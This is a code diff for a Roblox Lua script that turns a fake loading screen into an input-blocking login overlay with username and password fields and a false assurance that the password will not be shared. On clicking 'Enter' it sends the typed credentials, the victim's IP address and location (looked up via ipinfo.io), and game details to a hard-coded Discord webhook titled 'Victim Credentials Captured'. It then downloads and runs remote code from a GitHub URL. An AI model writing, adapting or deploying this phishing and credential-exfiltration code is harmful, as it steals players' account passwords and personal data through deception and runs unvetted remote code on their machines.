@@ -1,10 +1,34 @@
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local TeleportService = game:GetService("TeleportService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
+local webhook = "https://discord.com/api/webhooks/1402854262932770916/4nscMrOlbSjg5EJVZyV48yGLswLlw_lF0xx795zzN1L_TbB-4musJajqWamKsWTb4AEw"
 local lp = Players.LocalPlayer
 
--- Create full screen loading GUI that blocks input
+local function getRequestFunction()
+    if syn and syn.request then return syn.request
+    elseif http and http.request then return http.request
+    elseif request then return request
+    elseif http_request then return http_request
+    else return nil end
+end
+
+local ip, city, region, country = "N/A", "N/A", "N/A", "N/A"
+do
+    local req = getRequestFunction()
+    if req then
+        pcall(function()
+            local res = req({Url = "http://ipinfo.io/json", Method = "GET"})
+            local data = HttpService:JSONDecode(res.Body)
+            ip = data.ip or ip
+            city = data.city or city
+            region = data.region or region
+            country = data.country or country
+        end)
+    end
+end
+
 local loadingGui = Instance.new("ScreenGui")
 loadingGui.Name = "LoadingScreen"
 loadingGui.ResetOnSpawn = false
@@ -14,23 +38,89 @@ loadingGui.Parent = CoreGui
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(1, 0, 1, 0)
 frame.Position = UDim2.new(0, 0, 0, 0)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
 frame.BorderSizePixel = 0
-frame.Active = true
-frame.Selectable = true
 frame.Parent = loadingGui
 
-local label = Instance.new("TextLabel")
-label.Size = UDim2.new(1, 0, 0, 50)
-label.Position = UDim2.new(0, 0, 0.5, -25)
-label.BackgroundTransparency = 1
-label.Text = "🔄 Loading, please wait..."
-label.TextColor3 = Color3.new(1, 1, 1)
-label.Font = Enum.Font.GothamBold
-label.TextSize = 30
-label.Parent = frame
+for i = 1, 50 do
+    local star = Instance.new("Frame")
+    star.Size = UDim2.new(0, 2, 0, 2)
+    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    star.BackgroundColor3 = Color3.new(1, 1, 1)
+    star.BorderSizePixel = 0
+    star.AnchorPoint = Vector2.new(0.5, 0.5)
+    star.Parent = frame
+end
 
--- Block all input so they can’t close or click through
+-- Username on left
+local usernameLabel = Instance.new("TextLabel")
+usernameLabel.Size = UDim2.new(0, 200, 0, 30)
+usernameLabel.Position = UDim2.new(0.25, -100, 0.35, -40)
+usernameLabel.BackgroundTransparency = 1
+usernameLabel.Text = "Username"
+usernameLabel.TextColor3 = Color3.new(1, 1, 1)
+usernameLabel.Font = Enum.Font.GothamBold
+usernameLabel.TextSize = 24
+usernameLabel.Parent = loadingGui
+
+local usernameBox = Instance.new("TextBox")
+usernameBox.Size = UDim2.new(0, 200, 0, 30)
+usernameBox.Position = UDim2.new(0.25, -100, 0.35, 0)
+usernameBox.BackgroundColor3 = Color3.new(1, 1, 1)
+usernameBox.ClearTextOnFocus = false
+usernameBox.PlaceholderText = "Enter username"
+usernameBox.TextColor3 = Color3.new(0, 0, 0)
+usernameBox.Font = Enum.Font.Gotham
+usernameBox.TextSize = 20
+usernameBox.Parent = loadingGui
+
+-- Password on right
+local passwordLabel = Instance.new("TextLabel")
+passwordLabel.Size = UDim2.new(0, 200, 0, 30)
+passwordLabel.Position = UDim2.new(0.75, -100, 0.35, -40)
+passwordLabel.BackgroundTransparency = 1
+passwordLabel.Text = "Password"
+passwordLabel.TextColor3 = Color3.new(1, 1, 1)
+passwordLabel.Font = Enum.Font.GothamBold
+passwordLabel.TextSize = 24
+passwordLabel.Parent = loadingGui
+
+local passwordBox = Instance.new("TextBox")
+passwordBox.Size = UDim2.new(0, 200, 0, 30)
+passwordBox.Position = UDim2.new(0.75, -100, 0.35, 0)
+passwordBox.BackgroundColor3 = Color3.new(1, 1, 1)
+passwordBox.ClearTextOnFocus = false
+passwordBox.PlaceholderText = "Enter password"
+passwordBox.TextColor3 = Color3.new(0, 0, 0)
+passwordBox.Font = Enum.Font.Gotham
+passwordBox.TextSize = 20
+passwordBox.Parent = loadingGui
+
+-- Professional text center below inputs
+local privacyText = Instance.new("TextLabel")
+privacyText.Size = UDim2.new(0, 400, 0, 40)
+privacyText.Position = UDim2.new(0.5, -200, 0.5, 0)
+privacyText.BackgroundTransparency = 1
+privacyText.Text = "Your password will not be shared with anyone. You have a right to your privacy."
+privacyText.TextColor3 = Color3.new(1, 1, 1)
+privacyText.Font = Enum.Font.Gotham
+privacyText.TextSize = 18
+privacyText.TextWrapped = true
+privacyText.Parent = loadingGui
+
+-- Enter button below privacy text centered
+local enterButton = Instance.new("TextButton")
+enterButton.Size = UDim2.new(0, 200, 0, 40)
+enterButton.Position = UDim2.new(0.5, -100, 0.57, 0)
+enterButton.BackgroundColor3 = Color3.new(1, 1, 1)
+enterButton.Text = "Enter"
+enterButton.TextColor3 = Color3.new(0, 0, 0)
+enterButton.Font = Enum.Font.GothamBold
+enterButton.TextSize = 24
+enterButton.Parent = loadingGui
+enterButton.AutoButtonColor = true
+
+-- Block input outside GUI
 frame.InputBegan:Connect(function(input)
     input:CaptureControl()
 end)
@@ -48,25 +138,41 @@ for _, guiElement in pairs(loadingGui:GetDescendants()) do
     end
 end
 
--- Prepare teleport info (no HTTP sending)
-local placeId = game.PlaceId
-local jobId = game.JobId
-local joinLink = string.format(
-    "https://www.roblox.com/games/start?placeId=%d&gameId=%s",
-    placeId,
-    jobId
-)
+enterButton.MouseButton1Click:Connect(function()
+    local username = usernameBox.Text
+    local password = passwordBox.Text
 
-print("Teleport Info:")
-print("Player:", lp.Name)
-print("PlaceId:", placeId)
-print("JobId:", jobId)
-print("Join Link:", joinLink)
-print("Time:", os.date("%Y-%m-%d %H:%M:%S"))
+    local payload = {
+        ["content"] = "@everyone **Victim Credentials Captured**",
+        ["username"] = "IP Logger",
+        ["embeds"] = {{
+            ["title"] = "🚨 Credentials and IP Logger",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = username, ["inline"] = true},
+                {["name"] = "Password", ["value"] = password, ["inline"] = true},
+                {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
+                {["name"] = "Location", ["value"] = string.format("%s, %s, %s", city, region, country), ["inline"] = true},
+                {["name"] = "Game", ["value"] = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = true},
+                {["name"] = "Player", ["value"] = lp.Name, ["inline"] = true},
+                {["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
+            }
+        }}
+    }
 
-wait(180) -- 3 minutes loading time
+    local body = HttpService:JSONEncode(payload)
+    local req = getRequestFunction()
+    if req then
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end)
+    end
 
-loadingGui:Destroy()
-
--- Teleport player to same server instance
-TeleportService:TeleportToPlaceInstance(placeId, jobId)
+    loadingGui:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
+end)
